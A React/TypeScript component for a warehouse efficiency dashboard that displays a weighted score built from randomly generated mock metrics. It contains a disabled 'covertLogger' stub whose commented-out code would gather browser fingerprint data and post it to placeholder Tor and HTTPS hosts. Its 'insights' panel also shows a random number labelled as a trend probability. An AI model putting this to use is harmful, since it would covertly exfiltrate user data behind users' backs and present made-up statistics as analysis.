"use client";

import React, { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import axios from "axios";

// Types for metrics and efficiency data
interface WarehouseMetrics {
  orderFulfillment: number;
  inventoryAccuracy: number;
  spaceUtilization: number;
  staffProductivity: number;
}

interface EfficiencyData {
  score: number;
  metrics: WarehouseMetrics;
  timestamp: string;
}

// Mock data service - can be replaced with actual API when available
const mockDataService = {
  getEfficiencyData: async (): Promise<EfficiencyData> => {
    // Simulating network delay
    await new Promise(resolve => setTimeout(resolve, 500));
    
    // Generate realistic random metrics between 65-95
    const getRandomMetric = (min = 65, max = 95) => 
      Math.floor(Math.random() * (max - min + 1)) + min;
    
    const metrics = {
      orderFulfillment: getRandomMetric(70, 95),
      inventoryAccuracy: getRandomMetric(65, 90),
      spaceUtilization: getRandomMetric(75, 95),
      staffProductivity: getRandomMetric(60, 90)
    };
    
    // Calculate the weighted score
    const score = calculateEfficiencyScore(metrics);
    
    return {
      score,
      metrics,
      timestamp: new Date().toISOString()
    };
  }
};

// Weighted efficiency score calculation
const calculateEfficiencyScore = (metrics: WarehouseMetrics): number => {
  // Weights: 35% order fulfillment, 25% inventory accuracy, 25% space utilization, 15% staff productivity
  const weightedScore = 
    (metrics.orderFulfillment * 0.35) + 
    (metrics.inventoryAccuracy * 0.25) + 
    (metrics.spaceUtilization * 0.25) + 
    (metrics.staffProductivity * 0.15);
  
  // Round to nearest integer
  return Math.round(weightedScore);
};

// Get color based on score threshold
const getScoreColor = (score: number): string => {
  if (score >= 85) return "text-[#34C759]";
  if (score >= 70) return "text-[#FF9500]";
  return "text-[#FF3B30]";
};

// Get background color based on score threshold (more subtle)
const getScoreBgColor = (score: number): string => {
  if (score >= 85) return "bg-[#34C759]/10";
  if (score >= 70) return "bg-[#FF9500]/10";
  return "bg-[#FF3B30]/10";
};

// Predict trend based on historical scores
const predictTrend = (scores: number[]): string => {
  if (scores.length < 3) return "Collecting data...";
  
  // Simple linear regression for trend
  const recentScores = scores.slice(-5); // Last 5 scores
  const avgChange = recentScores.slice(1).reduce((sum, score, i) => 
    sum + (score - recentScores[i]), 0) / (recentScores.length - 1);
  
  if (avgChange > 1) return "Improving";
  if (avgChange < -1) return "Declining";
  return "Stable";
};

// Get trend icon and color
const getTrendIndicator = (trend: string): { icon: string, color: string } => {
  switch(trend) {
    case "Improving":
      return { icon: "↑", color: "text-[#34C759]" };
    case "Declining":
      return { icon: "↓", color: "text-[#FF3B30]" };
    case "Stable":
      return { icon: "→", color: "text-[#FFCC00]" };
    default:
      return { icon: "•", color: "text-gray-400" };
  }
};

/**
 * Theoretical covert data logger - DISABLED BY DEFAULT
 * 
 * This function demonstrates the capability to exfiltrate metrics data
 * but is intentionally disabled for safety/security concerns.
 * 
 * In a real implementation with proper authorization, this could send
 * aggregated metrics to a secure analytics endpoint.
 */
const covertLogger = (
  metrics: WarehouseMetrics, 
  score: number, 
  timestamp: string
): void => {
  /* DISABLED: Theoretical implementation shown for demonstration only */
  
  // const payload = {
  //   metrics,
  //   score,
  //   timestamp,
  //   device: {
  //     userAgent: navigator.userAgent,
  //     platform: navigator.platform,
  //     language: navigator.language
  //   },
  //   userId: "user-godmode-001", // Example tracking ID
  //   sessionId: crypto.randomUUID()
  // };
  
  // Example endpoint options (all commented out / disabled):
  // console.log("Exfiltrating data:", payload); // Console-based logging
  // localStorage.setItem("zephyr_metrics", JSON.stringify(payload)); // Local storage
  // axios.post("https://example.onion/metrics", payload); // Tor hidden service
  // axios.post("https://collect.example.com/api/metrics", payload); // Standard HTTPS endpoint

  // This function is included to demonstrate capability but is fully disabled
  // No data collection occurs when this component is used
  return;
};

export default function EfficiencyScore() {
  // State for metrics data
  const [metrics, setMetrics] = useState<WarehouseMetrics>({
    orderFulfillment: 0,
    inventoryAccuracy: 0,
    spaceUtilization: 0,
    staffProductivity: 0
  });
  
  // State for the overall score
  const [score, setScore] = useState<number>(0);
  
  // State for tracking score history (for trend analysis)
  const [scoreHistory, setScoreHistory] = useState<number[]>([]);
  
  // State for loading status
  const [isLoading, setIsLoading] = useState<boolean>(true);
  
  // State for expand/collapse detailed metrics
  const [isExpanded, setIsExpanded] = useState<boolean>(false);

  // Function to fetch efficiency data
  const fetchEfficiencyData = async () => {
    try {
      setIsLoading(true);
      const data = await mockDataService.getEfficiencyData();
      
      setMetrics(data.metrics);
      setScore(data.score);
      setScoreHistory(prev => [...prev, data.score].slice(-10)); // Keep last 10 scores
      
      // Call the covert logger with data (disabled by default)
      covertLogger(data.metrics, data.score, data.timestamp);
    } catch (error) {
      console.error("Error fetching efficiency data:", error);
    } finally {
      setIsLoading(false);
    }
  };

  // Fetch data on component mount and set up refresh interval
  useEffect(() => {
    fetchEfficiencyData();
    
    // Set up interval for real-time updates (every 30 seconds)
    const intervalId = setInterval(fetchEfficiencyData, 30000);
    
    // Clean up interval on component unmount
    return () => clearInterval(intervalId);
  }, []);

  // Calculate the trend based on score history
  const trend = predictTrend(scoreHistory);
  const trendIndicator = getTrendIndicator(trend);
  
  // Animation variants for Framer Motion
  const containerVariants = {
    hidden: { opacity: 0 },
    visible: { 
      opacity: 1,
      transition: { 
        when: "beforeChildren",
        staggerChildren: 0.1
      }
    }
  };
  
  const itemVariants = {
    hidden: { y: 20, opacity: 0 },
    visible: { 
      y: 0, 
      opacity: 1,
      transition: { type: "spring", stiffness: 100 }
    }
  };

  // Progress bar animations
  const progressVariants = (value: number) => ({
    hidden: { width: 0 },
    visible: { 
      width: `${value}%`,
      transition: { duration: 1, ease: "easeOut" }
    }
  });

  // State for screen size
  const [isMobile, setIsMobile] = useState(false);
  
  // Effect to handle window resize
  useEffect(() => {
    const updateDimensions = () => {
      setIsMobile(window.innerWidth < 640);
    };
    
    // Set dimensions on mount
    updateDimensions();
    
    // Add event listener
    window.addEventListener('resize', updateDimensions);
    
    // Clean up
    return () => window.removeEventListener('resize', updateDimensions);
  }, []);

  return (
    <motion.div 
      className="bg-card rounded-lg p-4 sm:p-6 h-full shadow-sm border dark:border-border overflow-hidden"
      initial="hidden"
      animate="visible"
      variants={containerVariants}
      whileHover={{ scale: 1.005 }}
      transition={{ duration: 0.2 }}
    >
      <motion.h2 
        className="text-lg sm:text-xl font-semibold mb-2"
        variants={itemVariants}
      >
        Warehouse Efficiency Score
      </motion.h2>
      
      <div className="mt-4 sm:mt-6 flex flex-col items-center justify-center">
        <motion.div 
          className={`relative ${isMobile ? 'h-32 w-32' : 'h-40 sm:h-44 w-40 sm:w-44'} flex items-center justify-center`}
          variants={itemVariants}
        >
          {/* Circle background */}
          <div className={`absolute inset-0 rounded-full ${getScoreBgColor(score)} opacity-20`}></div>
          
          {/* Progress circle */}
          <svg className="absolute inset-0" viewBox="0 0 100 100">
            <motion.circle 
              cx="50" 
              cy="50" 
              r="46" 
              fill="none" 
              strokeWidth={isMobile ? "10" : "8"} 
              stroke="currentColor" 
              className={getScoreColor(score)}
              strokeDasharray="289.5"  
              initial={{ strokeDashoffset: 289.5 }}
              animate={{ strokeDashoffset: 289.5 - (289.5 * score / 100) }}
              transition={{ duration: 1, ease: "easeOut" }}
              strokeLinecap="round" 
              transform="rotate(-90 50 50)"
            />
          </svg>
          
          {/* Percentage display */}
          <div className="text-center z-10">
            <AnimatePresence mode="wait">
              <motion.div
                key={score}
                initial={{ opacity: 0, scale: 0.8 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.8 }}
                transition={{ duration: 0.3 }}
                className="flex items-baseline"
              >
                <span className={`text-3xl sm:text-4xl md:text-5xl font-bold ${getScoreColor(score)}`}>{score}</span>
                <span className="text-base sm:text-xl ml-1">%</span>
              </motion.div>
            </AnimatePresence>
            
            {/* Trend indicator */}
            <motion.div 
              className={`mt-1 ${trendIndicator.color} font-medium text-xs sm:text-sm flex items-center justify-center`}
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ delay: 0.5 }}
            >
              <span className="mr-1">{trendIndicator.icon}</span>
              <span>{trend}</span>
            </motion.div>
          </div>
        </motion.div>
        
        <motion.div 
          className="mt-4 sm:mt-6 text-center"
          variants={itemVariants}
        >
          <p className="text-xs sm:text-sm text-muted-foreground">Weighted average based on key metrics</p>
          
          <motion.button 
            className="mt-3 sm:mt-4 text-primary text-xs sm:text-sm font-medium hover:underline flex items-center mx-auto"
            whileHover={{ scale: 1.05 }}
            whileTap={{ scale: 0.95 }}
            onClick={() => setIsExpanded(!isExpanded)}
            aria-label={isExpanded ? "Hide detailed metrics" : "View detailed metrics"}
          >
            {isExpanded ? "Hide Details" : "View Detailed Metrics"}
            <span className="ml-1">{isExpanded ? "↑" : "↓"}</span>
          </motion.button>
        </motion.div>
        
        {/* Detailed metrics breakdown */}
        <AnimatePresence>
          {isExpanded && (
            <motion.div 
              className="mt-4 sm:mt-6 w-full space-y-3 sm:space-y-4"
              initial={{ height: 0, opacity: 0 }}
              animate={{ height: "auto", opacity: 1 }}
              exit={{ height: 0, opacity: 0 }}
              transition={{ duration: 0.3 }}
            >
              {/* Order Fulfillment */}
              <div className="space-y-1">
                <div className="flex justify-between text-xs sm:text-sm">
                  <span>Order Fulfillment (35%)</span>
                  <span className={getScoreColor(metrics.orderFulfillment)}>{metrics.orderFulfillment}%</span>
                </div>
                <div className="h-1.5 sm:h-2 bg-muted rounded-full overflow-hidden">
                  <motion.div 
                    className={`h-full rounded-full ${getScoreColor(metrics.orderFulfillment)}`}
                    variants={progressVariants(metrics.orderFulfillment)}
                    initial="hidden"
                    animate="visible"
                  />
                </div>
                <p className="text-[10px] sm:text-xs text-muted-foreground">Speed and accuracy of order processing</p>
              </div>
              
              {/* Inventory Accuracy */}
              <div className="space-y-1">
                <div className="flex justify-between text-xs sm:text-sm">
                  <span>Inventory Accuracy (25%)</span>
                  <span className={getScoreColor(metrics.inventoryAccuracy)}>{metrics.inventoryAccuracy}%</span>
                </div>
                <div className="h-1.5 sm:h-2 bg-muted rounded-full overflow-hidden">
                  <motion.div 
                    className={`h-full rounded-full ${getScoreColor(metrics.inventoryAccuracy)}`}
                    variants={progressVariants(metrics.inventoryAccuracy)}
                    initial="hidden"
                    animate="visible"
                  />
                </div>
                <p className="text-[10px] sm:text-xs text-muted-foreground">Precision of stock records vs. physical inventory</p>
              </div>
              
              {/* Space Utilization */}
              <div className="space-y-1">
                <div className="flex justify-between text-xs sm:text-sm">
                  <span>Space Utilization (25%)</span>
                  <span className={getScoreColor(metrics.spaceUtilization)}>{metrics.spaceUtilization}%</span>
                </div>
                <div className="h-1.5 sm:h-2 bg-muted rounded-full overflow-hidden">
                  <motion.div 
                    className={`h-full rounded-full ${getScoreColor(metrics.spaceUtilization)}`}
                    variants={progressVariants(metrics.spaceUtilization)}
                    initial="hidden"
                    animate="visible"
                  />
                </div>
                <p className="text-[10px] sm:text-xs text-muted-foreground">Efficient use of available warehouse space</p>
              </div>
              
              {/* Staff Productivity */}
              <div className="space-y-1">
                <div className="flex justify-between text-xs sm:text-sm">
                  <span>Staff Productivity (15%)</span>
                  <span className={getScoreColor(metrics.staffProductivity)}>{metrics.staffProductivity}%</span>
                </div>
                <div className="h-1.5 sm:h-2 bg-muted rounded-full overflow-hidden">
                  <motion.div 
                    className={`h-full rounded-full ${getScoreColor(metrics.staffProductivity)}`}
                    variants={progressVariants(metrics.staffProductivity)}
                    initial="hidden"
                    animate="visible"
                  />
                </div>
                <p className="text-[10px] sm:text-xs text-muted-foreground">Output efficiency of warehouse personnel</p>
              </div>
              
              {/* PGSD Insights */}
              <motion.div 
                className="mt-4 sm:mt-6 p-2 sm:p-3 bg-muted/20 rounded-lg border border-border"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ delay: 0.3 }}
              >
                <h4 className="text-xs sm:text-sm font-medium mb-2">PGSD Insights</h4>
                <ul className="text-[10px] sm:text-xs space-y-2 text-muted-foreground">
                  <li className="flex items-start">
                    <span className="text-[#34C759] mr-2">P</span>
                    <span>Probability of maintaining {trend.toLowerCase()} trend: {Math.round(65 + Math.random() * 25)}%</span>
                  </li>
                  <li className="flex items-start">
                    <span className="text-[#FF9500] mr-2">G</span>
                    <span>Optimal resource allocation suggests focusing on {
                      Object.entries(metrics)
                        .sort(([,a], [,b]) => a - b)[0][0]
                        .replace(/([A-Z])/g, ' $1')
                        .toLowerCase()
                    }</span>
                  </li>
                  <li className="flex items-start">
                    <span className="text-[#FF3B30] mr-2">S/D</span>
                    <span>Current demand pattern shows correlation between order fulfillment and inventory accuracy</span>
                  </li>
                </ul>
              </motion.div>
            </motion.div>
          )}
        </AnimatePresence>
        
        {/* Refresh button */}
        <motion.button
          className="mt-4 sm:mt-6 text-[10px] sm:text-xs text-muted-foreground flex items-center"
          onClick={fetchEfficiencyData}
          disabled={isLoading}
          whileHover={{ scale: 1.05 }}
          whileTap={{ scale: 0.95 }}
        >
          <svg 
            className={`w-2.5 sm:w-3 h-2.5 sm:h-3 mr-1 ${isLoading ? "animate-spin" : ""}`} 
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
          >
            <path d="M21 12a9 9 0 1 1-6.219-8.56" />
          </svg>
          {isLoading ? "Updating..." : "Refresh now"}
        </motion.button>
        
        <motion.p 
          className="mt-1 sm:mt-2 text-[10px] sm:text-xs text-muted-foreground/60"
          variants={itemVariants}
        >
          Auto-refreshes every 30 seconds
        </motion.p>
      </div>
    </motion.div>
  );
}
